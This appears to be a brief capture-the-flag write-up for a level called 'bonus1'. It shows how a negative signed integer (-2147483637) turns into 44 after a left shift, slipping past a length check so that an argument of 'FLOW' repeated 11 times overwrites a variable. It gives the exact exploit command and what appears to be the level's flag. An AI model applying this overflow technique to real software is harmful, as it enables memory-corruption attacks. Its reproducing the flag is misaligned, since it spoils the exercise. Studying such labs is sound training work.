
The goal is to have a value than match with 44 bytes

```
* 4 == << 2
So
44 = 00101100b
>> 2 == 00001011b == 11
```
```
11d = 00000000 00000000 00000000 00001011b
10000000 00000000 00000000 00001011 = -2147483637
^
For the `-`
```
```
And if we << 2
00000000 00000000 00000000 00101100 = 44
```

[Signed integer (32-bit) Converter](https://www.binaryconvert.com/result_signed_int.html?hexadecimal=0000002C) (remove space)

```
FLOW <- reverse endian "WOLF" == 1464814662 

FLOW * 11 == 40 + 4
```

```bash
./bonus1 -2147483637 $(python -c 'print("FLOW" * 11)')
```

`579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
